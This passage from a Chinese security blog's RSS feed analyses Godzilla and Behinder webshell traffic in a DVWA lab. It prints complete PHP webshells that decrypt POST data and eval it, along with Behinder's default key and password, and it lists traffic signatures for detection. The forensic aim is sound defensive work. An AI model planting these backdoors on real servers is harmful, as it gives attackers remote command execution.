class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@session_start();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@set_time_limit(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@error_reporting(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function encode($D,$K) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	for ($i=0;$i&amp;lt;strlen($D);$i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$c = $K[$i+1&amp;amp;15];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$D[$i] = $D[$i]^$c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return $D;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$pass=&amp;#x27;key&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$payloadName=&amp;#x27;payload&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if (isset($_POST[$pass])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$data=encode(base64_decode($_POST[$pass]),$key);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	if (isset($_SESSION[$payloadName])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$payload=encode($_SESSION[$payloadName],$key);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		if (strpos($payload,&amp;quot;getBasicsInfo&amp;quot;)===false) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$payload=encode($payload,$key);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		teval($payload);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		echo substr(md5($pass.$key),0,16);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		echo base64_encode(encode(@run($data),$key));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		echo substr(md5($pass.$key),16);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		if (strpos($data,&amp;quot;getBasicsInfo&amp;quot;)!==false) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$_SESSION[$payloadName]=encode($data,$key);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到这便是 PHP 的加密脚本，把解密脚本中的 exit () 给注释掉，重新运行，能够看到终端返回的数据&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cDj4Klwx7PvggCh2.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;在这里能够看到是我们输入了命令 ls 之后的回显，切换另一个流试试&lt;/p&gt;
&lt;p&gt;tcp 流 32：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wA5tuDksQN35qidX.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;将对应的数据填入脚本当中，运行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MS0bzMoV5f6yrg4E.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;能够看到回显出了根目录底下的文件，便是 ls / 命令的回显&lt;/p&gt;
&lt;p&gt;接下来将加密器切换成 PHP_XOR_BASE64 重新上传抓包&lt;/p&gt;
&lt;p&gt;先看看它生成的马&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@session_start();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@set_time_limit(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@error_reporting(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function encode($D,$K)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for($i=0;$i&amp;lt;strlen($D);$i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $c = $K[$i+1&amp;amp;15];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $D[$i] = $D[$i]^$c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return $D;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$pass=&amp;#x27;pass&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$payloadName=&amp;#x27;payload&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if (isset($_POST[$pass]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $data=encode(base64_decode($_POST[$pass]),$key);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (isset($_SESSION[$payloadName]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $payload=encode($_SESSION[$payloadName],$key);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (strpos($payload,&amp;quot;getBasicsInfo&amp;quot;)===false)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $payload=encode($payload,$key);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        eval($payload);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo substr(md5($pass.$key),0,16);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo base64_encode(encode(@run($data),$key));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo substr(md5($pass.$key),16);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (strpos($data,&amp;quot;getBasicsInfo&amp;quot;)!==false)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $_SESSION[$payloadName]=encode($data,$key);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再来看看流量包的追踪流&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/79qMzmBEXGPmxwbd.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现加密器不同，追踪流的数据也就自然不同，该加密器下请求体解密方法为先 base64 后解 xor，在解密脚本找到相对应的解密模块试试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pO8s8NXrSMbCQSW1.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;也同样能够看到 ls / 命令之下的回显&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8w1r9fuqq7S2pF0S.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;切换下一个请求体与响应体对应解密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wmj2C45JJcjWfYeC.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;能够看到 ls 命令的回显&lt;/p&gt;
&lt;p&gt;对比了 PHP_EVAL_XOR_BASE64 和 PHP_XOR_BASE64 之后能够发现，PHP_EVAL_XOR_BASE64 下的请求体与响应体基本是一个流对应一条命令，而 PHP_XOR_BASE64 可以是多条命令的请求体与响应体存在同一个流之中&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://nnnpc.github.io/2024/04/16/%E5%86%B0%E8%9D%8Ev3.0%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/</guid>
            <title>冰蝎v3.0流量浅析</title>
            <link>https://nnnpc.github.io/2024/04/16/%E5%86%B0%E8%9D%8Ev3.0%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/</link>
            <category>流量</category>
            <pubDate>Tue, 16 Apr 2024 13:58:19 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;近期稍微对冰蝎的流量进行了一些分析，因此来记录一下&lt;/p&gt;
&lt;p&gt;首先用的工具是冰蝎 3.0 版本的，它相对于 2.0 来说，做出了一些改动，个人认为比较大的一个特点就是取消了动态密钥的获取，也就是说如果只是在一个加密的命令执行的追踪流下，是无法获取到加密后的密钥的，这里在 NSSCTF 开了一个 DVWA 的环境来进行一个上传的 getshell 演示&lt;/p&gt;
&lt;p&gt;首先直接在上传口上传蚁剑 v3.0 的 shell.php，这里就用 php 来进行演示&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4DCN2h1wG1fpqHRz.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到的是上传成功和路径，接下来进行冰蝎的连接&lt;/p&gt;
&lt;p&gt;首先点击新增&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pOhbzvHyt49soKp2.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在弹出来的页面编辑好 url 和密码&lt;/p&gt;
&lt;p&gt;这里先来看一下 shell.php&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@error_reporting(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;session_start();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $key=&amp;quot;e45e329feb5d925b&amp;quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $_SESSION[&amp;#x27;k&amp;#x27;]=$key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $post=file_get_contents(&amp;quot;php://input&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(!extension_loaded(&amp;#x27;openssl&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $t=&amp;quot;base64_&amp;quot;.&amp;quot;decode&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $post=$t($post.&amp;quot;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for($i=0;$i&amp;lt;strlen($post);$i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 $post[$i] = $post[$i]^$key[$i+1&amp;amp;15]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $post=openssl_decrypt($post, &amp;quot;AES128&amp;quot;, $key);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $arr=explode(&amp;#x27;|&amp;#x27;,$post);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $func=$arr[0];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $params=$arr[1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class C&amp;#123;public function __invoke($p) &amp;#123;eval($p.&amp;quot;&amp;quot;);&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @call_user_func(new C(),$params);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;能看到的是 e45e329feb5d925b 这一串 md5 的前 16 位，后面有注释显示的是密钥就是该 md5 为 rebeyond，那么就以这个作为连接密码进行冰蝎连接&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AzQcYoF255TLV9EC.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;保存之后双击添加的数据&lt;/p&gt;
&lt;p&gt;成功连接&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jiuskQYcIeZy6cqA.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来使用 wireshark 进行抓包分析&lt;/p&gt;
&lt;p&gt;同样在捕获 -&amp;gt; 选项设置好 WLAN 进行抓包&lt;/p&gt;
&lt;p&gt;接着在命令执行框中输入以下三条命令：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ls /&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ls /tmp&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ls /usr&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ItNIH1gcHM6NhruL.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着停止抓取流量进行分析&lt;/p&gt;
&lt;p&gt;首先先看到了 tcp 追踪流 23&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yLew2mlMcyrrEeO4.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;很明显的一个冰蝎流量加密，冰蝎的流量加密的最大一个特点就是先进行一次 base64 加密，再进行一次 AES 加密，至于冰蝎流量的特点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;User-Agent&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.9.168 Version/144 255 173)&amp;quot;&amp;gt;11.50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/5.0 (Windows; U; Windows NT 6.1; ) AppleWebKit/534.12 (KHTML, like Gecko) Maxthon/3.0 Safari/534.12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.33 Safari/534.3 SE 2.X MetaSr 1.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/144 255 173)&amp;quot;&amp;gt;13.0.782.41 Safari/535.1 QQBrowser/6.9.144 255 173)&amp;quot;&amp;gt;11079.201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E) QQBrowser/6.9.144 255 173)&amp;quot;&amp;gt;11079.201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;长连接&lt;br&gt;
冰蝎默认使用的是长连接，因此能看到&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MiLBm3HewNzi6SZ6.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Connection 为 keep-alive&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Accept&lt;br&gt;
 冰蝎的 Accept 字段很特殊，如图所示的请求体 Accept 字段&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6Rfq52djVgr0tpjs.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以在这里调整是查看请求包还是回应包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6S3tFiquxDFzKkaC.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来先将请求的加密字段拿去解密&lt;/p&gt;
&lt;p&gt;这里附上我使用的 aes 解密和 base64 解密网址：&lt;/p&gt;
